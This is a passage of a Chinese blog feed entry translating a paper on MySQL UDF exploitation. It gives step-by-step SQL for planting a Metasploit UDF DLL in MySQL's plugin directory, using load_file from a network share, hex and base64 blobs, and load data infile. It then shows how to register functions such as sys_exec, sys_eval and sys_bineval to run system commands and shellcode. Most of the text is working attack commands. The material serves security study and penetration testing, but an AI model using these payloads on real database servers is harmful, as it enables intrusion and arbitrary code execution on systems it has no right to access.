linker.</span><br></pre></td></tr></table></figure><p>看不懂的话就记住：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。</span><br></pre></td></tr></table></figure></p><p>更老的版本的 Mysql ，你可以写到这些路径里面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@@datadir</span><br><span class="line">@@basedir\bin</span><br><span class="line">C:\windows</span><br><span class="line">C:\windows\system</span><br><span class="line">C:\windows\system32</span><br></pre></td></tr></table></figure></p><h1 id="上传二进制文件"><a href="#上传二进制文件" class="headerlink" title="上传二进制文件"></a>上传二进制文件</h1><p>这里有很多种上传的方式，可以用 load_file 参数，要是可以的话你可以想办法直接拷贝过去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll&apos;) into dumpfile &quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;;</span><br></pre></td></tr></table></figure><p>也可以用 hex encoded 的方式上传<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(&apos;/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll&apos;)) into dumpfile &apos;/tmp/udf.hex&apos;;</span><br><span class="line"></span><br><span class="line">select 0x4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000000… into dump file &quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;;</span><br></pre></td></tr></table></figure></p><p>另外一种方法就是创建一个table,写入data。(insert update啥的方法都行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create table temp(data longblob);</span><br><span class="line"></span><br><span class="line">insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);</span><br><span class="line"></span><br><span class="line">update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000);</span><br><span class="line"></span><br><span class="line">select data from temp into dump file &quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;;</span><br></pre></td></tr></table></figure><p>你还可以通过本地或者外界的网络共享来写入到table中，利用 load data infile 命令。 将我上面展示的 hex 文件解码上传上去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">load data infile &apos;\\\\192.168.0.19\\network\\udf.hex&apos; </span><br><span class="line">into table temp fields terminated by &apos;@OsandaMalith&apos; </span><br><span class="line">lines terminated by &apos;@OsandaMalith&apos; (data);</span><br><span class="line"></span><br><span class="line">select unhex(data) from temp into dumpfile &apos;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&apos;;</span><br></pre></td></tr></table></figure><p>有个好消息是，<strong>MySQL 5.6.1</strong> 和 <strong>MariaDB 10.0.5</strong> 以上的版本都支持 <strong>to_base64</strong> and <strong>from_base64</strong> 这两个函数，可以用来 bypass。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select to_base64(load_file(&apos;/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll&apos;)) </span><br><span class="line">into dumpfile &apos;/tmp/udf.b64&apos;;</span><br></pre></td></tr></table></figure><p>也可以编辑 base64 的文件，写入到 plugin 文件下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select from_base64(&quot;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v</span><br><span class="line">ZGUuDQ0KJAAAAAAAAAAzwu3gd6ODs3ejg7N3o4OzafEQs3Wjg7Np8QCzfaODs2nxB7N1o4OzUGX4</span><br><span class="line">s3Sjg7N3o4KzW6ODs2nxCrN2o4OzafEWs3Wjg7Np8RGzdqODs2nxErN2o4OzUmljaHejg7MAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAUEUAAGSGBgBwsYNLAAAAAAAAAADwACIgCwIJAAASAAAAFgAAAAAAADQaAAAA</span><br><span class="line">EAAAAAAAgAEAAAAAEAAAAAIAAAUAAgAAAAAABQACAAAAAAAAgAAAAAQAADPOAAACAEABAAAQAAAA</span><br><span class="line">AAAAEAAAAAAAAAAAEAAAAAAAABAAAAAAAAAAAAAAEAAAAAA5AAAFAgAAQDQAADwAAAAAYAAAsAIA</span><br><span class="line">AABQAABoAQAAAAAAAAAAAAAAcAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAwAABwAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALnRleHQAAAAR</span><br><span class="line">EAAAABAAAAASAAAABAAAAAAAAAAAAAAAAAAAIAAAYC5yZGF0YQAABQsAAAAwAAAADAAAABYAAAAA&quot;) </span><br><span class="line">into dumpfile &quot;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&quot;;</span><br></pre></td></tr></table></figure></p><p>最后你可以把文件写入到数据库中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h192.168.0.30 -uosanda -pabc123 &lt; /tmp/udf.b64</span><br></pre></td></tr></table></figure></p><p>可以在外网或者网络共享当中写入文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select from_base64(data) from temp </span><br><span class="line">into dumpfile &apos;D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll&apos;;</span><br></pre></td></tr></table></figure></p><p>(操作很多啊，总结的很全面)</p><h1 id="深入-DLL"><a href="#深入-DLL" class="headerlink" title="深入 DLL"></a>深入 DLL</h1><p>(看不懂汇编，简单翻译一下吧 ==)</p><p>很多时候我看见其他人都只用 <strong>sys_exec</strong> 这个命令，但是文件的作者还是写了一些很有用的函数，这里我展示出来。<br><img src="/2019/07/12/译文-MySQL-UDF-Exploitation/export-dir.png" alt></p><h2 id="sys-exec"><a href="#sys-exec" class="headerlink" title="sys_exec"></a>sys_exec</h2><p>这个函数会传递参数(args-&gt;args[0])执行系统命令<br><img src="/2019/07/12/译文-MySQL-UDF-Exploitation/sys_exec2.png" alt></p><p>导入这个命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.func where name = &apos;sys_exec&apos;;</span><br><span class="line">+----------+-----+---------+----------+</span><br><span class="line">| name     | ret | dl      | type     |</span><br><span class="line">+----------+-----+---------+----------+</span><br><span class="line">| sys_exec |   2 | udf.dll | function |</span><br><span class="line">+----------+-----+---------+----------+</span><br></pre></td></tr></table></figure></p><p>确认：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.func where name = &apos;sys_exec&apos;;</span><br><span class="line">+----------+-----+---------+----------+</span><br><span class="line">| name     | ret | dl      | type     |</span><br><span class="line">+----------+-----+---------+----------+</span><br><span class="line">| sys_exec |   2 | udf.dll | function |</span><br><span class="line">+----------+-----+---------+----------+</span><br></pre></td></tr></table></figure></p><p><img src="/2019/07/12/译文-MySQL-UDF-Exploitation/sys_exec-verify.png" alt></p><p>删除命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop function sys_exec;</span><br></pre></td></tr></table></figure></p><h2 id="sys-eval"><a href="#sys-eval" class="headerlink" title="sys_eval"></a>sys_eval</h2><p>这个函数会通过 stdout 流将执行的命令回显出来，用到了 _popen 和 fgets。</p><p><img src="/2019/07/12/译文-MySQL-UDF-Exploitation/sys_eval.png" alt></p><p>导入这个命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function sys_eval returns string soname &apos;udf.dll&apos;;</span><br></pre></td></tr></table></figure></p><p>确认：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.func where name = &apos;sys_eval&apos;;</span><br></pre></td></tr></table></figure></p><p>删除：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop function sys_eval;</span><br></pre></td></tr></table></figure></p><p>利用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&apos;dir&apos;);</span><br></pre></td></tr></table></figure></p><p><img src="/2019/07/12/译文-MySQL-UDF-Exploitation/sys_eval_example.png" alt></p><h2 id="sys-get"><a href="#sys-get" class="headerlink" title="sys_get"></a>sys_get</h2><p>这个函数通过 <strong>getenv</strong> 返回给我们系统变量的值。</p><p><img src="/2019/07/12/译文-MySQL-UDF-Exploitation/sys_get_dis.png" alt></p><p>导入这个命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function sys_get returns string soname &apos;udf.dll&apos;;</span><br></pre></td></tr></table></figure></p><p>确认：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.func where name = &apos;sys_get&apos;;</span><br></pre></td></tr></table></figure></p><p>删除：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Drop function sys_get;</span><br></pre></td></tr></table></figure></p><p>利用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select sys_get(&apos;longonserver&apos;);</span><br></pre></td></tr></table></figure></p><p><img src="/2019/07/12/译文-MySQL-UDF-Exploitation/sys_get.png" alt></p><h2 id="执行shell-code-–-sys-bineval"><a href="#执行shell-code-–-sys-bineval" class="headerlink" title="执行shell code – sys_bineval"></a>执行shell code – sys_bineval</h2><p>我发现了一个很有趣的函数 <strong>sys_bineval</strong> ,它会分配 RWX内存(不知道什么是RWX)，将 <strong>VirtualAlloc API</strong> 和 <strong>strcpy the ‘args-&gt;args[0]’</strong> 参数，通过 <strong>CreateThread API</strong> 添加到一个新的进程当中。(看不懂直接略过就好了，反正也是执行系统命令的)</p><p><img src="/2019/07/12/译文-MySQL-UDF-Exploitation/sys_bineval.png" alt></p><p>导入这个命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function sys_bineval returns int soname &apos;udf.dll&apos;;</span><br></pre></td></tr></table></figure></p><p>确认：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.func where name = &apos;sys_bineval&apos;;</span><br></pre></td></tr></table></figure></p><p>删除：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop function sys_bineval;</span><br></pre></td></tr></table></figure></p><p>利用：<br>这里文章的作者在64位的操作系统下并没有成功，在32位下成功了，可以直接调用shellcode或者加密的base64或者hex转换<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_bineval(from_base64(load_file(&apos;./calc.b64&apos;)));</span><br></pre></td></tr></table></figure></p><p><img src="/2019/07/12/译文-MySQL-UDF-Exploitation/shellcode.png" alt></p><p>发现这些外来的 UDF 函数没有自带的异常处理(原文应该是这个意思)，有的时候可能出现错误造成mysql.exe crash，希望你在实战的过程中不要出现这样的情况。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="http://ftp.nchu.edu.tw/MySQL/doc/refman/5.0/en/create-function-udf.html" target="_blank" rel="noopener">http://ftp.nchu.edu.tw/MySQL/doc/refman/5.0/en/create-function-udf.html</a><br><a href="http://ftp.nchu.edu.tw/MySQL/doc/refman/4.1/en/create-function-udf.html" target="_blank" rel="noopener">http://ftp.nchu.edu.tw/MySQL/doc/refman/4.1/en/create-function-udf.html</a><br><a href="https://docs.oracle.com/cd/E19078-01/mysql/mysql-refman-5.0/extending-mysql.html" target="_blank" rel="noopener">https://docs.oracle.com/cd/E19078-01/mysql/mysql-refman-5.0/extending-mysql.html</a><br><a href="https://dev.mysql.com/doc/relnotes/mysql/5.6/en/news-5-6-1.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/relnotes/mysql/5.6/en/news-5-6-1.html</a><br><a href="https://dev.mysql.com/doc/refman/5.7/en/udf-arguments.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/udf-arguments.html</a><br><a href="https://msdn.microsoft.com/en-us/library/aa298534(v=vs.60).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/aa298534(v=vs.60).aspx</a></p><h1 id="Papers"><a href="#Papers" class="headerlink" title="Papers"></a>Papers</h1><p><a href="https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf?rss&amp;utm_source=dlvr.it&amp;utm_medium=twitter" target="_blank" rel="noopener">Exploit-DB</a><br><a href="https://packetstormsecurity.com/files/146430/MySQL-UDF-Exploitation.html" target="_blank" rel="noopener">Packet Storm</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;翻译完了才发现Freebuf上也有这篇文章，而且这个技术挺老的了，做个纪念吧 ==&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原文地址：&lt;a href=&quot;https://osandamalith.com/2018/02/11/mysql-udf-exploitation/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;MySQL UDF Exploitation&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
    
  </entry>
  
</feed>
